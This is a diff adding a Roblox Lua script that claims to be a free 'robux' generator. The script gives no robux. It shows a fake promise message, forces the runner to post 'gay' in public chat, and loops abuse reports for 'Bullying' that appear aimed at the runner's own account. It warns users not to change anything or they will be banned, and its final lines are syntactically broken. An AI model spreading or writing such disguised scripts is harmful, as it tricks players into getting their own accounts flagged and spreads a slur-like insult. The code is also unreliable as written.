@@ -1,0 +1,30 @@
+--THIS IS ROBUX SCRIPT MADE BY NewFissy
+
+-- DO NOT CHANGE ANYTHING OR YOU WILL GET BANNED
+
+robux = 50000 
+
+name = game.Players.LocalPlayer.Name
+
+print(name)
+
+msg = Instance.new("Message",workspace)
+
+msg.Name = "RobuxScript"
+
+msg.Text = "You will get robux in 24 hours!"
+
+wait(5)
+
+workspace.RobuxScript:Destroy()
+
+local args = {
+    [1] = "gay",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+while wait() do
+game.Players:ReportAbuse(game.Players.[name], "Bullying", "gay"
+end
